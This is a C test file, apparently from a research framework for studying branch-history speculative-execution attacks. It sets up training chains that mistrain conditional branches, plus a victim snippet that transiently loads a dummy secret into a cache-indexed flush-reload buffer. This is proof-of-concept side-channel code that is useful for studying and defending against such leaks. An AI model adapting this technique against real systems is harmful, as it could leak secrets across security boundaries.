#include "tests.h"

uint64_t *bh_args;
char dummy_secret_invalid = 0;

__attribute__((aligned(4096))) uint64_t arg_array[32*SIZE_CACHE_STRIDE];

static uint64_t *argv_chimera_train0[4] = {
    &arg_array[2*SIZE_CACHE_STRIDE], 
    &arg_array[3*SIZE_CACHE_STRIDE], 
    &arg_array[4*SIZE_CACHE_STRIDE], 
    &arg_array[5*SIZE_CACHE_STRIDE]
};

static uint64_t *argv_chimera_train1[4] = {
    &arg_array[12*SIZE_CACHE_STRIDE], 
    &arg_array[13*SIZE_CACHE_STRIDE], 
    &arg_array[14*SIZE_CACHE_STRIDE], 
    &arg_array[15*SIZE_CACHE_STRIDE]
};

static uint64_t *argv_chimera_leak[4] = {
    &arg_array[22*SIZE_CACHE_STRIDE], 
    &arg_array[23*SIZE_CACHE_STRIDE], 
    &arg_array[24*SIZE_CACHE_STRIDE], 
    &arg_array[25*SIZE_CACHE_STRIDE]
};

static void *bhs_dc_flush[1] = {&arg_array[22*SIZE_CACHE_STRIDE]};
struct argp_child argp_child_test[] = {0};

static bh_chain_params_t chain_bhs_safe = {
    .bh_tramp_p = &tramp_bcond,
    .ib_target = &t_alt,
    .bh_args_p = &bh_args,
    .nr_bh_cond_p = &args.nr_cond_bh,
    .nr_bh_ind_p = &args.nr_ind_bh,
    .nr_bh_for_p = &args.nr_for_bh,
    .ib_ptr_p = IBPTR,
    .frbuf_p = &frbuf,
    .secret_p = DUMMY_SECRET_P,
    .ex_argc = 1,
    .ex_argv = (char **)&argv_chimera_train0
    // .ex_argv = (char **)&argv_bcond_nt
};

static bh_chain_params_t chain_bhs_leak = {
    .bh_tramp_p = &tramp_bcond,
    .ib_target = &t_leak,
    .bh_args_p = &bh_args,
    .nr_bh_cond_p = &args.nr_cond_bh,
    .nr_bh_ind_p = &args.nr_ind_bh,
    .nr_bh_for_p = &args.nr_for_bh,
    .ib_ptr_p = IBPTR,
    .frbuf_p = &frbuf,
    .secret_p = DUMMY_SECRET_P,
    .ex_argc = 1,
    .ex_argv = (char **)&argv_chimera_train1
    // .ex_argv = (char **)&argv_bcond_tt
};

static bh_chain_params_t chain_bhs_test = {
    .bh_tramp_p = &tramp_bcond,
    .ib_target = &t_empty,
    .bh_args_p = &bh_args,
    .nr_bh_cond_p = &args.nr_cond_bh,
    .nr_bh_ind_p = &args.nr_ind_bh,
    .nr_bh_for_p = &args.nr_for_bh,
    .ib_ptr_p = IBPTR,
    .frbuf_p = &frbuf,
    .secret_p = DUMMY_SECRET_P,
    .ex_argc = 1,
    // .ex_argv = (char **)&argv_bcond_tt
    .ex_argv = (char **)&argv_chimera_leak
};

test_obj_t test_spec_bhs = {
    .nr_repeat = NR_TEST_ITER,
    .nr_train_passes = 4,
    .nr_train_chains = 2,
    .train_chains = (bh_chain_params_t *[]){&chain_bhs_safe, &chain_bhs_leak},
    .test_chain = &chain_bhs_test,
    .nr_dc_flush = 1,
    .dc_flush = (void **)bhs_dc_flush,
    .before_train = &t_empty,
    .before_test = &t_empty,
    .nr_probes = 2,
    .probes_p = (char *[]){DUMMY_SECRET_P, &dummy_secret_invalid},
    .description = "Train with {leak,safe} and test with safe"
};

run_obj_t run = {
    .nr_tests = 1,
    .bp_snippet = &asm_bhs_br_obj,
    .tests = {&test_spec_bhs},
};

void victim_snippet(uint64_t *offsets, uint64_t idx, char** argv, void **ib_ptr_p, char *frbuf, uint8_t *secret_p)
{
    register uint64_t frbuf_offset = 0;
    register uint64_t _c = *argv[2];
    register uint64_t _a=(uint64_t)argv[0], _b=(uint64_t)argv[1], _d=(uint64_t)argv[3];
    OPS_BARRIER(0x40);
    // load flags into registers
    _a=*(uint64_t*)_a;
    _b=*(uint64_t*)_b;
    _d=*(uint64_t*)_d;
    
    if (_d==0)
    {
        if (_a==0)
        {
            frbuf_offset = (*secret_p)*SIZE_CACHE_STRIDE;
            NOP(8);
        }
        if (_a==0 & _b==0)
        {
            NOP(8);
            return;
        }
        NOP(8);
        if (_c==0)
        {
            NOP(8);
        }
    }
    NOP(8);
    if (_b!=0)
    {
        NOP(8);
        return;
    }
    NOP(8);
    if (_a!=0)
    {
        MEM_ACCESS(&frbuf[frbuf_offset]);
        NOP(8);
    }
}

uint64_t test_continue = true;
bool next_run()
{
    bool ret = test_continue;
    test_continue &= false;
    return ret;
}

void init_test_bh_chains()
{
    *argv_chimera_train0[0] = 1;
    *argv_chimera_train0[1] = 0;
    *argv_chimera_train0[2] = 0;
    *argv_chimera_train0[3] = 1;

    *argv_chimera_train1[0] = 0;
    *argv_chimera_train1[1] = 1;
    *argv_chimera_train1[2] = 0;
    *argv_chimera_train1[3] = 0;

    *argv_chimera_leak[0] = 0;
    *argv_chimera_leak[1] = 0;
    *argv_chimera_leak[2] = 1;
    *argv_chimera_leak[3] = 0;
    bh_args = malloc((args.nr_cond_bh + 1) * sizeof(uint64_t));
    for (int i = 0; i < (args.nr_cond_bh + 1); i++)
        bh_args[i] = i%2;
    bh_args[args.nr_cond_bh] = (uint64_t)(&victim_snippet);
}

void free_test_bh_chains()
{
    free(bh_args);
}

void init_test()
{
    init_test_bh_chains();
}

void free_test()
{
    free_test_bh_chains();
}